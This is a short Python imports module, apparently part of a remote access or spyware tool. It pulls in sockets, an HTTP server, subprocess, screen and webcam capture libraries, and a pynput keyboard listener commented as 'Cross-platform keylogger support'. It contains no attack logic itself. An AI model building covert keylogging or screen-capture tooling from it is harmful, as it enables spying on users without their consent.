#mods/imports.py
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys
import os
import pickle
import socket
import time
import base64
import os
import tabulate
import signal
import shlex
import platform
import io
import psutil
import subprocess
import threading
import cv2
from PIL import ImageGrab , Image
import mss
from datetime import datetime
# Cross-platform keylogger support
try:
    from pynput.keyboard import Listener
    HAVE_X = True
except ImportError:
    HAVE_X = False
except Exception:
    HAVE_X = False
    